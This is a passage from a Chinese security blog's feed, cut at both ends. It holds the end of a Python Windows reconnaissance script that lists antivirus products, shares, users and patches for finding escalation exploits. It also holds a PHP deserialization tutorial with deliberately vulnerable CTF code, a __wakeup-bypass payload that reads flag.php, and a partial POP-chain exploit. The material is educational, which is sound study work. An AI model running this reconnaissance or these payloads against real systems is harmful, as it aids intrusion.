class="string">r&#x27;.*?OS 版本:\s+ (.*?)\r\nOS&#x27;</span></span><br><span class="line">        OSVersion = <span class="built_in">compile</span>(pattern6, DOTALL)</span><br><span class="line">        OSVersion = OSVersion.findall(result)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(OSName + &quot; &quot; + OSVersion)</span></span><br><span class="line">        self.OS = OSName + <span class="string">&quot; &quot;</span> + OSVersion</span><br><span class="line">        <span class="comment"># self.OS = OS</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AntiVirusList</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取杀软名称</span></span><br><span class="line">        response = Popen(<span class="string">&quot;wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        AVs = result.split(<span class="string">&#x27;\r\r\n&#x27;</span>)</span><br><span class="line">        AVs = <span class="built_in">set</span>([item.strip() <span class="keyword">for</span> item <span class="keyword">in</span> AVs[<span class="number">1</span>:-<span class="number">2</span>]])</span><br><span class="line">        self.AVName = AVs</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">NetShare</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取共享资源</span></span><br><span class="line">        response = Popen(<span class="string">&quot;net share&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern = <span class="string">r&#x27;.*?---\r\n(.*?)\r\n命令&#x27;</span></span><br><span class="line">        shareList = <span class="built_in">compile</span>(pattern, DOTALL)</span><br><span class="line">        shareList = shareList.findall(result)[<span class="number">0</span>]</span><br><span class="line">        shareList = <span class="string">&#x27; &#x27;</span>.join(shareList.split())</span><br><span class="line">        self.shareList = shareList</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runCommand</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.NetShare()</span><br><span class="line">        self.AntiVirusList()</span><br><span class="line">        self.userOpt()</span><br><span class="line">        self.SystemInfo()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printInfo</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]系统信息:&quot;</span>.ljust(<span class="number">15</span>), self.OS)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]当前主机名:&quot;</span>.ljust(<span class="number">15</span>), self.hostName)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]域/工作组:&quot;</span>.ljust(<span class="number">15</span>), self.domainWork)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]当前注册人:&quot;</span>.ljust(<span class="number">15</span>), self.registerName)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]当前用户名:&quot;</span>.ljust(<span class="number">15</span>), self.currentUser)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]当前用户属组:&quot;</span>.ljust(<span class="number">15</span>), self.currentUserGroup)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]所有用户名:&quot;</span>.ljust(<span class="number">15</span>), self.allUser)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]在线用户:&quot;</span>.ljust(<span class="number">15</span>),  self.OnlineUser)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]补丁安装情况:&quot;</span>.ljust(<span class="number">15</span>), self.patches)</span><br><span class="line">        print(<span class="string">&quot;[-]\n[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;复制补丁信息到网站查询可用exp：http://bugs.hacking8.com/tiquan/&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]杀软程序:&quot;</span>.ljust(<span class="number">15</span>), self.AVName)</span><br><span class="line">        print(<span class="string">&quot;[-]&quot;</span>,<span class="string">&quot;-&quot;</span>*<span class="number">100</span>)</span><br><span class="line">        print(<span class="string">&quot;[*]共享资源:&quot;</span>.ljust(<span class="number">15</span>), self.shareList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">info = getInformation()</span><br><span class="line">info.runCommand()</span><br><span class="line">info.printInfo()</span><br></pre></td></tr></table></figure><p>文件大小6KB，打包后约为6M。脑瓜子又嗡嗡的。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Windows-信息收集&quot;&gt;&lt;a href=&quot;#Windows-信息收集&quot; class=&quot;headerlink&quot; title=&quot;Windows 信息收集&quot;&gt;&lt;/a&gt;Windows 信息收集&lt;/h1&gt;&lt;p&gt;作为一个想偷懒的人，必然就想写个脚本对信息收集，免得自己丢三落四。然而，知道python打包的exe文件大，不知道这么大。于是只有个半成品。&lt;/p&gt;</summary>
    
    
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化总结</title>
    <link href="http://example.com/2020/11/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2020/11/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</id>
    <published>2020-11-12T00:01:45.000Z</published>
    <updated>2020-11-12T00:04:37.398Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><h3 id="PHP序列化与反序列化意义"><a href="#PHP序列化与反序列化意义" class="headerlink" title="PHP序列化与反序列化意义"></a>PHP序列化与反序列化意义</h3><p>在开发的过程中常常遇到需要把<strong>对象</strong>或者<strong>数组</strong>进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。</p><p><strong>序列化</strong>（串行化）：是将变量转换为可保存或传输的字符串的过程；</p><p><strong>反序列化</strong>（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p>常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 </p><a id="more"></a><h3 id="PHP序列化与反序列化入门"><a href="#PHP序列化与反序列化入门" class="headerlink" title="PHP序列化与反序列化入门"></a>PHP序列化与反序列化入门</h3><p>首先定义了一个类，其中包含两个共有变量<code>name</code>和<code>pass</code>。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094910.png" alt="image-20201108162349456"></p><p>序列化成了一长串字符串。其中O代表对象，4代表长度，come表示对象的名字，2表示对象有两个成员。括号里面就是描述这些成员。s表示是字符串，4表示该字符串中有4个字符。先尝试输出<code>$name</code>和<code>pass</code></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094916.png" alt="image-20201108164117690"></p><p>我对php反序列化漏洞的理解就是：新建了一个对象，并修改其中的成员变量，利用对象中的函数执行我们想让其执行的命令。我认为可以将其理解为SQL注入，注入的参数由攻击者任意设计，但是其中的过滤函数我们没办法修改，这里的成员函数就类似于sql注入中的过滤函数，只能使劲的想办法绕过，或者在php反序列化中使劲的利用这些函数进行命令等执行。</p><p>例如想让<code>getInfo</code>输出一些其他的东西。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Rainbow&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Username: &#x27;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot; Password: &quot;</span> . <span class="keyword">$this</span>-&gt;pass;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$come1</span> = <span class="keyword">new</span> come();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$come1</span>-&gt;getInfo().<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;come&#x27;</span>])-&gt;getInfo();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$come1</span>-&gt;getInfo().<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094920.png" alt="image-20201108170225906"></p><p>可以看到，<code>Username</code>和<code>Password</code>的值已经变了，其实就是新建了一个对象，然后调用<code>come</code>对象里面的<code>getInfo</code>函数输出 。</p><p>上面只是一个public的案例，接下来再看看成员变量是private时候的情况。private修饰的成员变量在序列化时会产生一个从%00经过urldecode解码后的符号来显出他的特殊。说起来绕口，直接上图片：</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094926.png" alt="image-20201108185458912"></p><p>显示不出来的，就是%00经过url解码后的符号。相应的protected修饰的成员变量序列化的情况如下：</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094929.png" alt="image-20201108190839867"></p><p>protected使用的前缀为%00*%00 对成员变量进行修饰。</p><h3 id="PHP类的魔术方法"><a href="#PHP类的魔术方法" class="headerlink" title="PHP类的魔术方法"></a>PHP类的魔术方法</h3><p>魔术方法就是在序列化或者反序列化的时候，程序会”情不自禁”的去调用这些函数。常见的有下面5个</p><ul><li>__construct 当一个对象创建时被调用</li><li>__destruct 当一个对象销毁时被调用</li><li>__toString 当一个对象被当作一个字符串使用</li><li>__sleep 在对象被序列化之前运行</li><li>__wakeup 在对象被反序列化之后被调用</li><li>__call():当要调用的方法不存在或权限不足时自动调用</li><li>__invoke():当把一个类当作函数使用时自动调用</li></ul><p>拿网上最好的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;construct run&#x27;</span>;</span><br><span class="line"></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;destruct run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;toString run&#x27;</span>;</span><br><span class="line">                  <span class="keyword">return</span> <span class="string">&#x27;qwe&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;sleep run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;wakeup run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test</span>= <span class="keyword">new</span> Test(); <span class="comment">// 创建对象的时候运行 construct</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sTest</span>= serialize(<span class="variable">$test</span>); <span class="comment">// 序列化的时候先调用 sleep</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$usTest</span>= unserialize(<span class="variable">$sTest</span>); <span class="comment">// 反序列先调用__wakeup函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$string</span>= <span class="string">&#x27;hello class &#x27;</span> . <span class="variable">$test</span>;  <span class="comment">// 调用toString函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//整个结束调用destruct函数</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="关卡一"><a href="#关卡一" class="headerlink" title="关卡一"></a>关卡一</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$KEY</span> = <span class="string">&quot;D0g3!!!&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (unserialize(<span class="variable">$str</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到如果反序列化<code>$_GET&#123;&#39;str&#39;]</code>之后的内容为<code>D0g3!!!</code>，那么就能成功。那就简单了，逆向考虑，<code>$str=serialize($KEY)</code>即可</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094936.png" alt="image-20201108203657455"></p><h4 id="关卡二"><a href="#关卡二" class="headerlink" title="关卡二"></a>关卡二</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">&quot;\\&quot;</span>)===<span class="literal">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">&#x27;/&#x27;</span>)===<span class="literal">false</span>)</span><br><span class="line">                    show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">                <span class="keyword">else</span>      </span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Wrong filename.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt; file=<span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">        show_source(<span class="string">&#x27;index.php&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$file</span>=base64_decode( <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">        <span class="keyword">echo</span> unserialize(<span class="variable">$file</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span>   &lt;!--key in flag.php--&gt;</span><br></pre></td></tr></table></figure><p>这里通过<code>$_GET[&#39;file&#39;]</code>获取然后base64解码，然后再执行反序列化。然后看下漏洞怎么利用，反序列化会首先调用<code>wakeup</code>函数，在这里，会直接把文件名直接给替换成<code>index.php</code>，然后才会show源码。既然不能改变<code>$file</code>的值，那么只有绕过这个函数了。</p><p>构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;SoFun&quot;:1:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125;    这是正常构造的payload，但是这个payload会经过wakeup函数</span><br><span class="line"></span><br><span class="line">但是要想绕过wakeup，需要修改到下面这种形式</span><br><span class="line"></span><br><span class="line">O:5:&quot;SoFun&quot;:2:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125;    这里就能绕过wakeup函数，将成员函数的变量设置成比实际成员变量大，就能绕过</span><br></pre></td></tr></table></figure><p>绕过具体可以参考<a href="https://www.cnblogs.com/zy-king-karl/p/11436872.html">https://www.cnblogs.com/zy-king-karl/p/11436872.html</a></p><h4 id="关卡三"><a href="#关卡三" class="headerlink" title="关卡三"></a>关卡三</h4><p>来源：<a href="https://bbs.ichunqiu.com/thread-45290-1-1.html?from=aqzx4">https://bbs.ichunqiu.com/thread-45290-1-1.html?from=aqzx4</a></p><p>一串连环套的调用案例，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;`字符串拼接`&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那只有倒退了。要想获取flag，就要调用<code>get_flag</code>函数，要想调用<code>get_flag</code>函数，就需要掉i用<code>__toString</code>方法，而这个方法只在被当作字符串输出的时候才会被调用，有输出的就是<code>func</code>类里面的<code>invoke</code>函数，而<code>invoke</code>函数只有把类当作函数使用的时候才会被调用，然后又看到<code>funct</code>对象，而<code>call</code>只有调用方法不存在的情况下被调用，再看到<code>Call</code>，里面调用了一个不知道的函数，然后就追溯到<code>destruct</code>函数。构造payload：</p><p>在每个函数里面添加一个 construct初始化函数，并指向下一个函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span 